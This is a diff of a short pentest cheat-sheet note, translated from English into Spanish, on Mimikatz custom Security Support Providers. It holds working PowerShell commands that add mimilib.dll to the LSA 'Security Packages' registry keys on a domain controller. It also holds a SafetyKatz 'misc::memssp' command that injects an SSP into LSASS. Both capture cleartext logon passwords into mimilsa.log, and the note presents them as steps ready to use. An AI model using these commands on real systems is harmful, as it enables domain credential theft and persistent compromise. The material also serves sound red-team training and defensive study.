@@ -3,28 +3,29 @@
 Tags: #AD #Windows #Powershell #SafetyKatz 
 
 ```bash 
-A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are
+Un 'Security Support Provider (SSP)' es una DLL que proporciona mecanismos para que una aplicación obtenga una conexión autenticada. Algunos paquetes SSP de Microsoft son:
 
-	- NTLM
-	- Kerberos
-	- Wdigest
-	- CredSSP
+- NTLM
+- Kerberos
+- Wdigest
+- CredSSP
 
-Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.
+'Mimikatz' proporciona un SSP personalizado — 'mimilib.dll'. Este SSP registra inicios de sesión locales, así como contraseñas de cuentas de servicio y de máquina en texto claro en el servidor objetivo.
 ```
 
 ```powershell 
-We can use either of the ways:
+! Usuario: Domain Admin (ejecutado en el DC)
 
-# Drop the mimilib.dll to system32 and add mimilib to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages:
-❯ $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
+❯ $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
 ❯ $packages += "mimilib"
 ❯ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
 ❯ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
+# Registrar mimilib.dll como Security Package en el DC — persiste entre reinicios y loguea credenciales en texto claro de todos los logons locales en C:\Windows\system32\mimilsa.log.
 
-# Using mimikatz, inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable):
 ❯ SafetyKatz.exe -Command '"misc::memssp"'
+# Inyectar un SSP malicioso en LSASS en memoria — captura credenciales de logons sin necesidad de reinicio. Menos estable en Server 2019/2022 pero funcional.
 
-Notes:
-	1. All local logons on the DC are logged to 'cat C:\Windows\system32\mimilsa.log'
+
+Notas:
+	1. Todos los inicios de sesión locales en el Domain Controller se registran en 'C:\Windows\system32\mimilsa.log'.
 ```
